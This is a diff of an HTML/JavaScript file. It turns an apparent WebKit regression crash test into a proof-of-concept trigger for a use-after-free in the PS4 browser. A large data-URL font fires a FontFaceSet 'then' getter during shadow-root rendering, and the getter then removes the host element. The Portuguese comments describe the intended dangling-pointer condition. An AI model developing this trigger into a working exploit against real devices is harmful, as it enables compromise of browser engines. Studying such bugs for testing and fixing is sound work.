@@ -1,78 +1,83 @@
+
 <!DOCTYPE html>
 <html>
+<head><meta charset="utf-8"></head>
 <body>
+<pre id="log"></pre>
 <script>
-// Style::Scope::flushPendingDescendantUpdates() used to walk
-// Document::m_inDocumentShadowRoots (a WeakListHashSet) with a live iterator while
-// making a per-root flushPendingUpdate() callout. That callout re-registers the
-// shadow scope's @font-face rules, which removes the previous CSSFontFace; when that
-// face is the only loading one, document.fonts.ready settles synchronously and its
-// thenable assimilation runs an author getter. Disconnecting the iterated shadow
-// root from that getter frees the list node the iterator points at.
+// UAF via host.remove() durante rendering de shadow root
+//
+// Mecanismo confirmado:
+//   100KB data URL → opportunisticallyStartFontDataURLLoading (PS4 sincrono)
+//   → font carrega durante glyph walk do rendering
+//   → FontFace.loaded → FontFaceSet.prototype.then → getter dispara
+//   → DURANTE o rendering ativo do shadow root
+//
+// Se host.remove() durante rendering causa UAF:
+//   O renderer ainda tem ponteiros para o shadow root / RenderObject
+//   host.remove() → desanexa o node e invalida os render objects
+//   Rendering continua com objetos potencialmente liberados → UAF
 
+function log(s) { document.getElementById('log').textContent += s + '\n'; }
 
-
-// Touch document.fonts before the load event so that FontFaceSet is marked as
-// document-loaded; completedLoading() only settles the ready promise in that state.
 document.fonts;
 
-function log(message)
-{
-    document.body.appendChild(document.createTextNode(message));
-    document.body.appendChild(document.createElement("br"));
-}
+// 100KB — confirmado que dispara getter durante rendering no PS4
+var pendingUrl = 'url("data:font/woff;base64,' + 'A'.repeat(100000) + '")';
 
-function run()
-{
-    const host = document.createElement("div");
+function run() {
+    var host = document.createElement('div');
     document.body.appendChild(host);
-    const shadowRoot = host.attachShadow({ mode: "open" });
+    var shadowRoot = host.attachShadow({ mode: 'open' });
 
-    const fontFaceStyle = document.createElement("style");
-    fontFaceStyle.textContent = `@font-face { font-family: reentryFont; src: url("resources/no-such-font-for-reentry.otf"); }`
-        + `.probe { font: 24px reentryFont; }`;
+    var fontFaceStyle = document.createElement('style');
+    fontFaceStyle.textContent =
+        '@font-face { font-family: reentryFont; src: ' + pendingUrl + '; }' +
+        '.probe { font: 24px reentryFont; }';
     shadowRoot.appendChild(fontFaceStyle);
 
-    const probe = document.createElement("span");
-    probe.className = "probe";
-    probe.textContent = "A";
+    var probe = document.createElement('span');
+    probe.className = 'probe';
+    probe.textContent = 'A';
     shadowRoot.appendChild(probe);
 
-    document.body.offsetHeight; // Force layout so the font load starts.
-    document.fonts.load("24px reentryFont", "A");
-    log("document.fonts.status: " + document.fonts.status);
+    void document.body.offsetHeight;
+    log('status: ' + document.fonts.status);
+    document.fonts.load('24px reentryFont', 'A');
+    void document.fonts.ready;
 
-    // Materialize the JS promise for the ready proxy that startedLoading() re-armed,
-    // so that settling it goes through JSPromise::resolve() and its thenable check.
-    document.fonts.ready;
-
-    // Give the shadow scope a pending UpdateType::ActiveSet whose flush takes the
-    // ResolverUpdateType::Reset path, so all of its sheets (including the @font-face
-    // one) get re-processed. Prepending rather than appending is what makes
-    // analyzeStyleSheetChange() pick Reset.
-    const prependedStyle = document.createElement("style");
-    prependedStyle.textContent = ".unused { color: red; }";
+    var prependedStyle = document.createElement('style');
+    prependedStyle.textContent = '.x { color: blue; }';
     shadowRoot.prepend(prependedStyle);
 
-    let getterCallCount = 0;
-    Object.defineProperty(FontFaceSet.prototype, "then", {
+    var getterCount = 0;
+    Object.defineProperty(FontFaceSet.prototype, 'then', {
         configurable: true,
-        get() {
+        get: function() {
             delete FontFaceSet.prototype.then;
-            ++getterCallCount;
-            host.remove(); // Frees the iterated Document::m_inDocumentShadowRoots node.
+            getterCount++;
+            log('[GETTER] disparou durante rendering — chamando host.remove()');
+            // Remover o host enquanto o renderer esta processando o shadow root
+            // O glyph walk ainda esta ativo na call stack C++
+            // RenderObject do shadow root pode estar com dangling pointer
+            host.remove();
             return undefined;
         }
     });
 
-    document.styleSheets.length; // Reaches Scope::flushPendingDescendantUpdates().
+    log('getter instalado — aguardando rendering...');
 
-    log("FontFaceSet.prototype.then getter calls: " + getterCallCount);
-    log("PASS if no crash.");
-
+    setTimeout(function() {
+        log('getter count: ' + getterCount);
+        if (getterCount === 0)
+            log('getter nao disparou');
+        log('PASS se chegou aqui sem crash');
+    }, 500);
 }
 
-window.addEventListener("load", () => setTimeout(run, 0));
+window.addEventListener('load', function() {
+    setTimeout(run, 0);
+});
 </script>
 </body>
 </html>
